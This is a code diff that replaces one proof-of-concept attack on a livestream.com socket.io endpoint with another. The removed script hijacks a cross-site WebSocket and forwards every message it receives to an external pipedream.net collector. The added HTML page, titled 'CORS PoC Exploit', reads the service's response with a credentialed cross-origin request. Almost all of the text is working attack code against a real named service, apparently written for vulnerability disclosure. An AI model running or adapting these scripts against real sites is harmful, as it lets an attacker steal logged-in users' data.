@@ -1,11 +1,25 @@
-<script>
-websocket = new WebSocket('wss://sio-1.livestream.com/socket.io/1/websocket/E5cg34mEVqALYcMYNiKa/')
-websocket.onopen = start
-websocket.onmessage = handleReply
-function start(event) {
-  websocket.send("READY");
-}
-function handleReply(event) {
-  fetch('https://enlx84bmwk6oa.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
-}
-</script>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("GET", "https://sio-1.livestream.com/socket.io/1/?viewer_id=29118900&t=1595336998366", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
